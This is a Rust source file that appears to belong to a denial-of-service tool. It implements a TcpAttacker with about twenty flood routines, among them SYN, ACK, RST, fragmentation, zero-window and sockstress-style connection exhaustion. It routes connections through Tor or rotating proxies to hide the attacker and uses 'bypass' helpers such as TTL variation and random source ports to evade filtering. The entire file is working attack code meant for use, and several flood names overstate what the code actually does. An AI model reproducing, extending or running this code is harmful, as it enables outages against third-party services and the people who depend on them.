use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::Duration;
use std::io::Write;
use std::net::{TcpStream, SocketAddr};
use rand::Rng;
use socket2::{Socket, Domain, Type, Protocol};
use crate::attack::WorkerCtx;
use crate::bypass::{PacketBypass, TcpBypass};

pub struct TcpAttacker { ctx: WorkerCtx }

impl TcpAttacker {
    pub fn from_ctx(ctx: &WorkerCtx) -> Self { Self { ctx: ctx.clone() } }

    fn alive(&self) -> bool { self.ctx.alive() }
    fn ok(&self)            { self.ctx.ok(); }
    fn err(&self)           { self.ctx.err(); }

    fn rand_bytes(n: usize) -> Vec<u8> {
        (0..n).map(|_| rand::thread_rng().gen()).collect()
    }

    
    async fn acquire(&self) -> Option<tokio::sync::SemaphorePermit> {
        self.ctx.connect_sem.acquire().await.ok()
    }

    fn fast_socket() -> Option<Socket> {
        let s = Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)).ok()?;
        let _ = s.set_nonblocking(true);
        let _ = s.set_reuse_address(true);
        let _ = s.set_send_buffer_size(65536);
        let _ = s.set_recv_buffer_size(4096);
        let _ = s.set_nodelay(true);
        Some(s)
    }

    fn connect_direct(&self) -> Option<TcpStream> {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = addr.parse().ok()?;
        let s = TcpStream::connect_timeout(&sa, Duration::from_millis(self.ctx.connect_ms)).ok()?;
        s.set_nodelay(true).ok()?;
        s.set_write_timeout(Some(Duration::from_millis(self.ctx.write_ms))).ok()?;
        s.set_read_timeout(Some(Duration::from_millis(self.ctx.read_ms))).ok()?;
        Some(s)
    }

    
    fn connect(&self) -> Option<TcpStream> {
        let timeout = Duration::from_millis(self.ctx.connect_ms);

        if let Some(ref socks) = self.ctx.tor_socks {
            
            let proxy = crate::proxy::Proxy {
                host: "127.0.0.1".to_string(),
                port: socks.split(':').nth(1).and_then(|p| p.parse().ok()).unwrap_or(9050),
                ptype: crate::config::ProxyType::Socks5,
                username: None, password: None,
                latency_ms: 0, alive: true, fail_count: 0,
            };
            proxy.tunnel(&self.ctx.target, self.ctx.port, timeout).ok()
        } else if let Some(ref pool) = self.ctx.proxy_pool {
            if let Some(proxy) = pool.get() {
                match proxy.tunnel(&self.ctx.target, self.ctx.port, timeout) {
                    Ok(s) => Some(s),
                    Err(_) => {
                        pool.mark_failed(&proxy);
                        self.connect_direct()
                    }
                }
            } else {
                self.connect_direct()
            }
        } else {
            self.connect_direct()
        }
    }

    fn write_all_tracked(&self, s: &mut TcpStream, data: &[u8]) -> bool {
        match s.write_all(data) {
            Ok(_) => {
                self.ctx.add_bytes(data.len() as u64);
                self.ok();
                true
            }
            Err(_) => { self.err(); false }
        }
    }

    fn burst(&self, s: &mut TcpStream, data: &[u8], n: usize) {
        for _ in 0..n {
            if !self.alive() { break; }
            if !self.write_all_tracked(s, data) { break; }
        }
    }

    
    pub async fn syn_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            for _ in 0..32 {
                if !self.alive() { break; }
                match Self::fast_socket() {
                    Some(s) => { let _ = s.connect(&sa.into()); self.ok(); }
                    None    => { self.err(); }
                }
            }
        }
    }

    
    pub async fn ack_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                self.burst(&mut s, &Self::rand_bytes(256), 200);
            } else { self.err(); }
        }
    }

    
    pub async fn rst_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_linger(Some(Duration::ZERO));
                    let _ = s.set_nonblocking(true);
                    let _ = s.connect(&sa.into());
                    self.ok();
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn fin_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match self.connect() {
                Some(s) => { drop(s); self.ok(); }
                None    => { self.err(); }
            }
        }
    }

    
    pub async fn syn_ack_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            for _ in 0..16 {
                if !self.alive() { break; }
                match Self::fast_socket() {
                    Some(s) => {
                        let _ = s.set_reuse_port(true);
                        let _ = s.connect(&sa.into());
                        self.ok();
                    }
                    None => { self.err(); }
                }
            }
        }
    }

    
    pub async fn push_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                let _ = s.set_nodelay(true);
                self.burst(&mut s, &Self::rand_bytes(4096), 50);
            } else { self.err(); }
        }
    }

    
    pub async fn null_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Self::fast_socket() {
                Some(s) => { let _ = s.connect(&sa.into()); self.ok(); }
                None    => { self.err(); }
            }
        }
    }

    
    pub async fn xmas_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                self.write_all_tracked(&mut s, &vec![0xFFu8; 64]);
            } else { self.err(); }
        }
    }

    
    pub async fn connection_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
            let sent = self.ctx.sent.clone();
            let errors = self.ctx.errors.clone();
            let _running = self.ctx.running.clone();
            tokio::spawn(async move {
                match tokio::net::TcpStream::connect(&addr).await {
                    Ok(_s) => {
                        sent.fetch_add(1, Ordering::Relaxed);
                        tokio::time::sleep(Duration::from_millis(500)).await;
                    }
                    Err(_) => { errors.fetch_add(1, Ordering::Relaxed); }
                }
            });
        }
    }

    
    pub async fn fragmentation_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                let data = Self::rand_bytes(16384);
                for chunk in data.chunks(8) {
                    if !self.alive() { break; }
                    if !self.write_all_tracked(&mut s, chunk) { break; }
                }
            } else { self.err(); }
        }
    }

    
    pub async fn zero_window_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_recv_buffer_size(0);
                    let _ = s.set_send_buffer_size(65536);
                    let _ = s.set_nonblocking(true);
                    let _ = s.connect(&sa.into());
                    self.ok();
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn window_scale_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            let s = TcpBypass::window_scale_tricks();
            if let Ok(sa) = addr.parse::<SocketAddr>() {
                let _ = s.connect(&sa.into());
                self.ok();
            } else { self.err(); }
        }
    }

    
    pub async fn ttl_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_ttl(PacketBypass::ttl_variation() as u32);
                    let _ = s.set_nonblocking(true);
                    if let Ok(sa) = addr.parse::<SocketAddr>() {
                        let _ = s.connect(&sa.into());
                        self.ok();
                    }
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn src_port_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let src: SocketAddr = format!("0.0.0.0:{}", PacketBypass::random_src_port())
                        .parse().unwrap_or("0.0.0.0:0".parse().unwrap());
                    let _ = s.set_reuse_address(true);
                    let _ = s.set_reuse_port(true);
                    let _ = s.bind(&src.into());
                    let _ = s.set_nonblocking(true);
                    if let Ok(sa) = addr.parse::<SocketAddr>() {
                        let _ = s.connect(&sa.into());
                        self.ok();
                    }
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn half_open_rst(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        let sa: SocketAddr = match addr.parse() { Ok(a) => a, Err(_) => return };
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_linger(Some(Duration::ZERO));
                    let _ = s.set_send_buffer_size(0);
                    let _ = s.set_nonblocking(true);
                    let _ = s.connect(&sa.into());
                    self.ok();
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn urgent_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                self.write_all_tracked(&mut s, &[0xFFu8]);
            } else { self.err(); }
        }
    }

    
    pub async fn mss_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_nonblocking(true);
                    let _ = s.set_recv_buffer_size(1);
                    let _ = s.set_nodelay(true);
                    if let Ok(sa) = addr.parse::<SocketAddr>() {
                        let _ = s.connect(&sa.into());
                        self.ok();
                    }
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn sockstress(&self) {
        let mut pool: Vec<TcpStream> = vec![];
        while self.alive() {
            if pool.len() < 5000 {
                let _permit = match self.acquire().await { Some(p) => p, None => break };
                if let Some(s) = self.connect() {
                    pool.push(s);
                    self.ok();
                }
            }
            pool.retain(|s| {
                matches!(s.peek(&mut [0u8; 1]), Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock)
            });
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }

    
    pub async fn persist_timer_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            match Socket::new(Domain::IPV4, Type::STREAM, Some(Protocol::TCP)) {
                Ok(s) => {
                    let _ = s.set_recv_buffer_size(0);
                    if let Ok(sa) = addr.parse::<SocketAddr>() {
                        let _ = s.connect(&sa.into());
                        self.ok();
                        tokio::time::sleep(Duration::from_secs(300)).await;
                    }
                }
                Err(_) => { self.err(); }
            }
        }
    }

    
    pub async fn mixed_flags_flood(&self) {
        while self.alive() {
            let _permit = match self.acquire().await { Some(p) => p, None => break };
            if let Some(mut s) = self.connect() {
                for payload in &[
                    &[0x00u8][..],
                    &[0xFF, 0xFF, 0xFF, 0xFF],
                    b"\x00\x00\x00\x01\x04\x00\x00\x00",
                    b"\r\n\r\n",
                ] {
                    if !self.alive() { break; }
                    if !self.write_all_tracked(&mut s, payload) { break; }
                }
            } else { self.err(); }
        }
    }
}
